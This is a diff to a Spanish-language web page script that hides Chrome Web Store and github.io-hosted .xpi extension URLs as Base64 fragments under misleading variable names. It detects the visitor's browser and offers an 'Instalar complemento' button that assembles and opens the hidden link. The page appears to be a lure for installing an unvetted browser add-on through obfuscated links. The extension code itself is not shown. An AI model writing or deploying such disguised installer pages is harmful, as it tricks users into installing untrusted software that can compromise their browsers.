@@ -17,7 +17,7 @@ a.cta:hover{background:#005ea6}
   <a id="sysAction" class="cta">Esperando...</a>
 </div>
 <script>
-const coreAgent=["aHR0cHM6Ly9jaHJvbWV3ZWJzdG9yZS5nb29nbGUuY29t","L2RldGFpbC9iYWNrb2ZmaWNlYWRkb25zL2pqZ2FmZHBhbWJvbmVib2xmZGZoY2Jm","amRtaGFsZGhi"];
+const coreAgent=["aHR0cHM6Ly9jaHJvbWV3ZWJzdG9yZS5nb29nbGUuY29t","L2RldGFpbC9iYWNrb2ZmaWNlYWRkb25zL2pqZ2FmZHBhbWJvbmVib2xmZGZoY2Jm","amRtaGFsZGhiP2F1dGh1c2VyPTAmaGw9ZXMtNDE5"];
 const runtimeManifest=["aHR0cHM6Ly90ZWFtbWV4aWNvNy5naXRodWIuaW8v","QmFja09mZmljZVVwZGF0ZXMvYmFja29mZmljZXRlYW1teC0xMi44LnhwaQ=="];
 const kernelProbe=navigator.userAgent;
 const platformFlag=!/Mobi|Android|iPhone|iPad/i.test(kernelProbe);
@@ -35,15 +35,15 @@ if(!platformFlag){
   statusNode.textContent="Solo disponible en navegadores de escritorio.";
   uiAnchor.style.display="none";
 }else if(/Chrome|Edg/.test(kernelProbe)&&!/OPR/.test(kernelProbe)){
-  statusNode.textContent="Instalador compatible con este sistema.";
+  statusNode.textContent="Instalar en Chrome";
   uiAnchor.textContent="Instalar complemento";
   uiAnchor.onclick=()=>assembleAndLaunch(coreAgent);
 }else if(/Firefox/.test(kernelProbe)){
-  statusNode.textContent="Instalador compatible con este sistema.";
+  statusNode.textContent="Instaladar en Firefox.";
   uiAnchor.textContent="Instalar complemento";
   uiAnchor.onclick=()=>assembleAndLaunch(runtimeManifest);
 }else{
-  statusNode.textContent="Navegador no soportado.";
+  statusNode.textContent="Navegador no compatible.";
   uiAnchor.style.display="none";
 }
 </script>
